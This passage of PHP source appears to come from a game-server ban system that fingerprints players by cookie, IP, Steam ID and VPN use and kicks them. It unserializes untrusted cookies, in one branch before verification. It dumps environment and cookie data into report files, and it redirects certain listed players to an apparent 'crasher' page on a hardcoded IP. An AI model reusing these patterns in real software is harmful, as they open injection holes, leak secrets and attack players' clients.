        $stmt = $pdoreg->prepare("
            UPDATE herboy_regsystem 
            SET LoginKey = :uuid 
            WHERE LoginKey = :oldkey
        ");

        // Bind the parameters to the query
        $stmt->bindParam(':uuid', $uuid, PDO::PARAM_STR);
        $stmt->bindParam(':oldkey', $oldkey, PDO::PARAM_STR);

        // Execute the query
        running_time("update_new_loginkey", "execute");
        $stmt->execute();
        query_running();

        // Check if the update was successful
        if ($stmt->rowCount() > 0) {
            return true;  // Update was successful
        } else {
            return false; // No rows were affected, possibly incorrect $oldkey
        }

    } catch (PDOException $e) {
        // Handle any errors
        triggerCustomError(E_USER_WARNING, 'Database error in update_new_loginkey: ' . $e->getMessage(), $e->getFile(), $e->getLine());
        return false;
    }
}

function get_curr_account(&$player_cluster) {
    global $pdoreg;

    running_time("get_curr_account", "prepare");
    $stmt = $pdoreg->prepare("SELECT id FROM herboy_regsystem WHERE LoginKey = :loginkey LIMIT 1");
    $stmt->execute([':loginkey' => $player_cluster['UUID']]);
    query_running();
    running_time("get_curr_account", "execute");
    $result = $stmt->fetch(PDO::FETCH_ASSOC);

    if ($result) {
        $account_id = $result['id'];
        if (!in_array($account_id, $player_cluster['ACCOUNTs'])) {
            $player_cluster['ACCOUNTs'][] = $account_id;
        }
    }
}

function checkExecution()
{
    global $runtime, $bids, $vpn_or_proxy, $player_is_nonsteam, $query_ran, $indicators, $player_cluster, $Errors, $currtime;

    // Calculate the total runtime
    $runtime_time = array_sum(array_column($runtime, 'time'));
    $connection_status = connection_status();

    if ($runtime_time > 10 || $connection_status !== CONNECTION_NORMAL || !empty($Errors)) {
        // Generate a new UUID for the report file
        $report_uuid = uuidv4();
        $report_filename = "240831__{$report_uuid}.rep";
        $report_directory = __DIR__."/reps/";

        // Check if the directory exists, if not, create it
        if (!is_dir($report_directory)) {
            mkdir($report_directory, 0755, true);
        }
        $shutdown_reason = "";

        if($connection_status === CONNECTION_NORMAL && connection_aborted())
            $connection_status = CONNECTION_ABORTED;

        if ($connection_status === CONNECTION_NORMAL) {
            $shutdown_reason = "Script completed normally.";
        } elseif ($connection_status & CONNECTION_ABORTED) {
            $shutdown_reason = "Script was interrupted by the user.";
        } elseif ($connection_status & CONNECTION_TIMEOUT) {
            $shutdown_reason = "Script was interrupted due to a timeout.";
        } else {
            $shutdown_reason = "Script was interrupted for an unknown reason.";
        }

        // Prepare the report content
        $report_content = "*************** ".$currtime." ***************\n";
        $report_content .= "EXECUTION EXCEEDED LIMIT: " . number_format($runtime_time, 6) . " seconds | UUID: " . $player_cluster['UUID'] . "\n";
        $report_content .= "SHUTDOWN REASON: ".$shutdown_reason."\n";
        $report_content .= "WAS THERE ERROR?: ".(!empty($Errors) ? "TRUE" : "FALSE")."\n";
        $report_content .= "**************************************************\n";

        // Append $_COOKIE, $_ENV, $_FILES, $_GET, $_POST, $_REQUEST, $_SERVER, $_SESSION in JSON format
        $report_content .= json_encode([
            'COOKIE' => $_COOKIE,
            'ENV' => $_ENV,
            'FILES' => $_FILES,
            'GET' => $_GET,
            'POST' => $_POST,
            'REQUEST' => $_REQUEST,
            'SERVER' => $_SERVER,
            'SESSION' => $_SESSION ?? []
        ], JSON_PRETTY_PRINT) . "\n\n";

        // Append other key information
        if (is_array($bids)) {
            $report_content .= "BID: " . implode(',', $bids) . "\n";
        } else {
            // Ha nem tömb, akkor csak adjuk hozzá a stringet
            $report_content .= "BID: " . $bids . "\n";  // Vagy egy hibaüzenet
        }
        $report_content .= "vpn_or_proxy: " . ($vpn_or_proxy ? "true" : "false") . "\n";
        $report_content .= "is_user_steam: " . (!$player_is_nonsteam ? "true" : "false") . "\n";
        $report_content .= "Execution time: " . number_format($runtime_time, 6) . " seconds\n";
        $report_content .= "Execution sql queries: " . $query_ran . " queries\n";
        if (isset($indicators) && is_array($indicators)) {
            $report_content .= "Indicators count: " . count($indicators) . " indicators\n\n";
        } else {
            // Ha $indicators null, akkor 0-t írunk ki
            $report_content .= "Indicators count: 0 indicators\n\n";
        }
        // Append runtime breakdown in ASCII table format
        $report_content .= "Runtime Breakdown:\n";
        $report_content .= "+-------------------------+-------------------------+------------------+\n";
        $report_content .= "| Function                | Subtask                 | Time (sec)       |\n";
        $report_content .= "+-------------------------+-------------------------+------------------+\n";
        foreach ($runtime as $entry) {
            $report_content .= sprintf("| %-23s | %-23s | %-16.6f |\n", $entry['functionname'], $entry['subtask'], $entry['time']);
        }
        $report_content .= "+-------------------------+-------------------------+------------------+\n\n";

        if (!empty($Errors)) {
            $report_content .= "Errors:\n";
            foreach ($Errors as $error_message) {
                $report_content .= $error_message."\n";
            }
            $report_content .= "\n";
        }

        $report_content .= "player_cluser: " . json_encode($player_cluster, JSON_PRETTY_PRINT);

        // Write the report content to the file
        file_put_contents($report_directory . $report_filename, $report_content);

        // Send Discord alert with the report filename included
        sendDiscordAlert($player_cluster['UUID'], $runtime_time, $report_filename, $connection_status, $shutdown_reason);
    }
}

function sendDiscordAlert($uuid, $executionTime, $report_filename, $connection_status, $shutdown_reason)
{
    global $Errors;
    $webhookUrl = DISCORD_WEBHOOK_URL;
    $desc = "@everyone ".(!empty($Errors) ? "There was an error during execution." : ($connection_status === CONNECTION_NORMAL ? 'Execution time exceeded 10 seconds.' : $shutdown_reason));
    $embed = [
        'title' => 'Execution Time Alert',
        'description' => $desc,
        'color' => 15158332,  // Red color
        'fields' => [
            [
                'name' => 'Execution Time',
                'value' => sprintf('%.2f seconds', $executionTime),
                'inline' => true
            ],
            [
                'name' => 'UUID',
                'value' => $uuid,
                'inline' => true
            ],
            [
                'name' => 'Reported File',
                'value' => '`'.$report_filename.'`'
            ]
        ],
        'footer' => [
            'text' => 'BanSys_v2 Alert System',
        ],
        'timestamp' => date('c')
    ];

    $data = json_encode([
        'content' => '',
        'embeds' => [$embed],
        'allowed_mentions' => [
            'parse' => ['everyone']
        ]
    ]);

    $ch = curl_init($webhookUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);

    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        triggerCustomError(E_USER_WARNING,'sendDiscordAlert curl_error: '.curl_error($ch), __FILE__, __LINE__);
    }
    curl_close($ch);

    return $response;
}

//******************************************************
// STAGE 0 - INIT SQL
//******************************************************

try {
    running_time("STAGE 0", "INIT SQL");
    $pdo = new PDO("mysql:host=$mysql_host;dbname=$mysql_dbdb", $mysql_user, $mysql_pass);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    $pdoreg = new PDO("mysql:host=$mysql_host;dbname=s2_herboy", $mysql_user, $mysql_pass);
    $pdoreg->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    $pdoban = new PDO("mysql:host=$mysql_host;dbname=bansys", $mysql_user, $mysql_pass);
    $pdoban->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    triggerCustomError(E_USER_WARNING, 'Database connection failed: ' . $e->getMessage(), $e->getFile(), $e->getLine());
    exit;
}

//******************************************************
// STAGE 1 - PREPARE DATA
//******************************************************
running_time("STAGE 1","PREPARE DATA");
$player_cluster = array();

if(isset($_COOKIE[$cookiename]) && $g_steam == "STEAM_1:0:1070363078")
{
    $cookie_content = unserialize(base64url_decode($_COOKIE[$cookiename]));
    $uuid = decrypt_string($cookie_content['UUID']);
    if($uuid == "64baca00-0554-402a-b438-d37902b37725")
    {
        triggerCustomError(E_USER_WARNING,'HOPII FASZSÁG MEGOLDVA', __FILE__, __LINE__);
        create_player_cluster($player_cluster, $g_steam, $g_ipv4, $localIp, $currtime, $cookiename);
    }
}

if(!isset($_COOKIE[$cookiename]))
{
    running_time("STAGE 1","create_player_cluster");
    create_player_cluster($player_cluster, $g_steam, $g_ipv4, $localIp, $currtime, $cookiename);
    $g_new = true;
}
else
{
    $cookie_content = unserialize(base64url_decode($_COOKIE[$cookiename]));
    if (!isset($cookie_content["HASHCHECK"])) 
    {
        $olddata = $cookie_content;
        running_time("create_player_cluster","(old data)");
        create_player_cluster($player_cluster, $g_steam, $g_ipv4, $localIp, $currtime, $cookiename);
        if (isset($olddata['steamid']) && is_array($olddata['steamid'])) {
            foreach ($olddata['steamid'] as $old_steamid) {
                if(!is_nonsteam($old_steamid)) {
                    add_steamid($player_cluster, $old_steamid);
                }
            }
        }
        if (isset($olddata['UKey'])) {
            $player_cluster['OLDUKEY'][] = [
                'ukey' => $olddata['UKey'],
                'collecttime' => $currtime
            ];

            update_new_loginkey($olddata['UKey'], $player_cluster['UUID']);
        }
    }
    else
    {
        if(hash('sha256', UUID_HASH_SALT . $cookie_content['UUID']) != $cookie_content['HASHCHECK'])
        {
            triggerCustomError(E_USER_WARNING,'FAILED HASHCHECK UUID', __FILE__, __LINE__);
            finished();
        }


        $uuid = decrypt_string($cookie_content['UUID']);
        running_time("STAGE 1","get_player_cluster");
        get_player_cluster($uuid, $player_cluster);

        running_time("STAGE 1","add_steamid");
        add_steamid($player_cluster, $g_steam);
        running_time("STAGE 1","add_ip (g_ipv4)");
        add_ip($player_cluster, $g_ipv4);

        if($g_ipv4 != $localIp) {
            running_time("STAGE 1","add_ip (localIp)");
            add_ip($player_cluster, $localIp);
        }
    }
}
get_curr_account($player_cluster);
$player_cluster['lastseen'] = $currtime;
//******************************************************
// STAGE 2 - SYNC INDICATORS
//******************************************************
running_time("STAGE 2","SYNC INDICATORS");
$queriedIndicators = [];
$chainstate = [];
$checked_uuids[] = $player_cluster['UUID'];

sync_indicators($player_cluster, $chainstate, $queriedIndicators, $checked_uuids);

if(!empty($player_cluster['PAIRs']))
    $g_new = false;

//******************************************************
// STAGE 3 - GET BAN
//******************************************************
running_time("STAGE 3","GET BAN");


$indicators = [];

// Add PRX_CURRENT indicators
$indicators[] = ['type' => IND_UUID, 'value' => $player_cluster['UUID'], 'scope' => PRX_CURRENT];
$indicators[] = ['type' => IND_STEAMID, 'value' => $g_steam, 'scope' => PRX_CURRENT];
$indicators[] = ['type' => IND_IP, 'value' => $g_ipv4, 'scope' => PRX_CURRENT];
$indicators[] = ['type' => IND_IP, 'value' => $localIp, 'scope' => PRX_CURRENT];

// Add PRX_LOCAL or PRX_SYNCED indicators for IPs and ASNs
foreach ($player_cluster['IPs'] as $ip_data) {
    $scope = $ip_data['is_sync'] ? PRX_SYNCED : PRX_LOCAL;
    $indicators[] = ['type' => IND_IP, 'value' => $ip_data['indicator'], 'scope' => $scope];
    
    // Add ASN if it exists
    if (!empty($ip_data['asn_asn'])) {
        $indicators[] = ['type' => IND_ASN, 'value' => $ip_data['asn_asn'], 'scope' => $scope];
    }
}

// Add PRX_LOCAL or PRX_SYNCED indicators for STEAMIDs
foreach ($player_cluster['STEAMIDs'] as $steamid_data) {
    $scope = $steamid_data['is_sync'] ? PRX_SYNCED : PRX_LOCAL;
    $indicators[] = ['type' => IND_STEAMID, 'value' => $steamid_data['indicator'], 'scope' => $scope];
}

// Add PRX_SYNCED indicators for PAIRs
foreach ($player_cluster['PAIRs'] as $pair_uuid) {
    $indicators[] = ['type' => IND_UUID, 'value' => $pair_uuid, 'scope' => PRX_SYNCED];
}

// Remove duplicates by indicator value, keeping the one with the lower PRX_ value
$unique_indicators = [];
foreach ($indicators as $indicator) {
    $key = $indicator['type'] . '_' . $indicator['value'];

    // If the indicator is not in the array or the current scope is lower, update the array
    if (!isset($unique_indicators[$key]) || $unique_indicators[$key]['scope'] > $indicator['scope']) {
        $unique_indicators[$key] = $indicator;
    }
}

// Convert back to indexed array
$indicators = array_values($unique_indicators);



$player_is_nonsteam = is_nonsteam($g_steam);

$bids = get_matching_ban_bids($indicators);

$whitelist_blacklist = update_IND_CACHE_if_needed();


$applied_blacklist = null; // Store the applied blacklist if matched
$applied_whitelist = [];
running_time("whitelist checking", "start");
foreach ($whitelist_blacklist as $wob_list) {
    // Perform steam_bypass check early to avoid unnecessary processing
    if (!$player_is_nonsteam && $wob_list['steam_bypass']) {
        continue; // Skip this blacklist if it's bypassable by Steam and the player is non-Steam
    }

    // Check if the whitelist/blacklist entry is within the start_time and expire_time range
    $current_time = new DateTime();
    $start_time = new DateTime($wob_list['start_time']);
    $expire_time = isset($wob_list['expire_time']) ? new DateTime($wob_list['expire_time']) : null;

    if ($current_time < $start_time || ($expire_time && $current_time > $expire_time)) {
        continue; // Skip if the current time is outside the valid time range
    }

    // Skip processing if this wob_list has been excluded by a previous whitelist
    if (isset($excluded_wob_lists) && in_array($wob_list['id'], $excluded_wob_lists)) {
        continue;
    }

    foreach ($indicators as $indicator) {
        if (
            ($indicator['type'] === IND_IP && $wob_list['indicator_type'] === 'ip') ||
            ($indicator['type'] === IND_STEAMID && $wob_list['indicator_type'] === 'steamid') ||
            ($indicator['type'] === IND_IP && $wob_list['indicator_type'] === 'ip_interval') ||
            ($indicator['type'] === IND_ASN && $wob_list['indicator_type'] === 'asn') ||
            ($indicator['type'] === IND_UUID && $wob_list['indicator_type'] === 'UUID') ||
            ($wob_list['indicator_type'] === 'regex') // Regex can match any of them
        ) {
            // Proceed with further checks since the types match or it's a regex
            // Further logic goes here...
        } else {
            continue; // Skip if indicator types don't match
        }

        
        if ($scope_map[$wob_list['scope']] < $indicator['scope']) {
            continue;
        }

        // Check if the indicator matches the wob_list filter
        $matches = false;
        switch ($wob_list['indicator_type']) {
            case 'ip_interval':
                $matches = ip_in_range($indicator['value'], $wob_list['indicator_value']);
                break;
            case 'regex':
                try {
                    $matches = preg_match($wob_list['indicator_value'], $indicator['value']);
                } catch (\Throwable $e) {
                    triggerCustomError(E_USER_WARNING, 'regex error in whitelist_blacklist '.$wob_list['id'].': ' . $e->getMessage(), $e->getFile(), $e->getLine());
                }
                break;
            default:
                $matches = ($indicator['value'] === $wob_list['indicator_value']);
                break;
        }

        if (!$matches) {
            continue;
        }

        if (!$wob_list['is_whitelist']) { // It's a blacklist
            $applied_blacklist = $wob_list; // Store the applied blacklist
            break 2; // Break out of both loops and apply the blacklist
        } else { // It's a whitelist
            if (!empty($wob_list['excludes'])) {
                $applied_whitelist[] = ['indicator' => $indicator, 'listid' => $wob_list['id']];
                $excludes = explode(',', $wob_list['excludes']);
                $exclude_type = array_shift($excludes); // Get the first letter (b or l)

                if ($exclude_type === 'b') {
                    // Remove matching bids from $bids
                    $bids = array_diff($bids, $excludes);
                } elseif ($exclude_type === 'l') {
                    // Exclude future wob_lists by ID
                    $excluded_wob_lists = array_merge($excluded_wob_lists ?? [], $excludes);
                }
            }
        }
    }
}
running_time("whitelist checking", "end");

if(!isset($player_cluster['USERAGENTs']))
    $player_cluster['USERAGENTs'] = array();

if (isset($_SERVER['HTTP_USER_AGENT']) && !in_array($_SERVER['HTTP_USER_AGENT'], $player_cluster['USERAGENTs'])) {
    $player_cluster['USERAGENTs'][] = $_SERVER['HTTP_USER_AGENT'];
}

//******************************************************
// STAGE 4 - NOTIFY SERVER
//******************************************************
running_time("STAGE 4","NOTIFY SERVER");
$steamidchanger = check_for_steamid_changer($player_cluster, $g_steam);
$vpn_or_proxy = check_vpn_or_proxy($player_cluster, $localIp, $g_ipv4);


//public ValidatorSocketHandler(callbackid, socket, id, wob_validator, ban_id, is_steamid_changed, const sUkey[])
running_time("(socket)VSH", 'sending');
$passargs = array(
    "i", $gid, 
    "i", $g_validator, 
    "i", (!empty($bids) ? $bids[0] : 0),
    "i", ($steamidchanger ? 1 : 0),
    "s", $player_cluster['UUID']
);
$skres = sck_CallPawnFunc("BanSystemv4.amxx", "ValidatorSocketHandler", $passargs);
if($skres != 1 && $skres != 0)
    triggerCustomError(E_USER_WARNING,'(socket)VSH ret:'.$skres, __FILE__, __LINE__);
running_time("(socket)VSH", 'sent');


if(!empty($bids))
{
    $player_cluster['PUNISHLOGs'][] = [
        'tpye' => "ban",
        'indicator' => implode(',', $bids),
        'time' => $currtime
    ];
}

if ($applied_blacklist) {
    running_time("(socket)WOB_kick", 'sending');
    $passargs = array("i", $gid, "i", $g_validator, "s", $applied_blacklist['note']);
    $skres = sck_CallPawnFunc("BanSystemv4.amxx", "WOB_kick", $passargs);
    if($skres != 1 && $skres != 0)
        triggerCustomError(E_USER_WARNING,'(socket)WOB_kick ret:'.$skres, __FILE__, __LINE__);
    running_time("(socket)WOB_kick", 'sent');
    $player_cluster['PUNISHLOGs'][] = [
        'tpye' => "blacklist",
        'indicator' => $applied_blacklist['id'],
        'time' => $currtime
    ];
}

if($vpn_or_proxy && $player_is_nonsteam)
{
    running_time("(socket)VPN_kick", 'sending');
    $passargs = array("i", $gid, "i", $g_validator);
    $skres = sck_CallPawnFunc("BanSystemv4.amxx", "VPN_kick", $passargs);
    if($skres != 1 && $skres != 0)
        triggerCustomError(E_USER_WARNING,'(socket)VPN_kick ret:'.$skres, __FILE__, __LINE__);
    running_time("(socket)VPN_kick", 'sent');
    $player_cluster['PUNISHLOGs'][] = [
        'tpye' => "MASKING",
        'indicator' => $g_ipv4." OR ".$localIp,
        'time' => $currtime
    ];
}

if($g_new)
{
    $tmp_new_url = $_SERVER['REQUEST_SCHEME'] ."://". $_SERVER['HTTP_HOST'] . "/ban_api/ensure.php?".$_SERVER['QUERY_STRING']."&f=".$final_url;
    $final_url = $tmp_new_url;
    running_time("(socket)newuser_print", 'sending');
    $passargs = array("i", $gid, "i", $g_validator);
    $skres = sck_CallPawnFunc("BanSystemv4.amxx", "newuser_print", $passargs);
    if($skres != 1 && $skres != 0)
        triggerCustomError(E_USER_WARNING,'(socket)newuser_print ret:'.$skres, __FILE__, __LINE__);
    running_time("(socket)newuser_print", 'sent');
}

//******************************************************
// STAGE 5 - STORE DATA
//******************************************************
running_time("STAGE 5","STORE DATA");
store_player_cluster($player_cluster);

running_time("FINISH", '');

$query = "SELECT `steamid` FROM `webcrasher` WHERE `steamid` = :steamid LIMIT 1;";
$stmt = $pdo->prepare($query);
$stmt->bindParam(':steamid', $g_steam, PDO::PARAM_STR);
$stmt->execute();
$results = $stmt->fetchAll(PDO::FETCH_ASSOC);
if(count($results) > 0) {
    $final_url = "http://194.180.16.153/ban_api/crasher.html?ver122254123";
    exit();
}
?>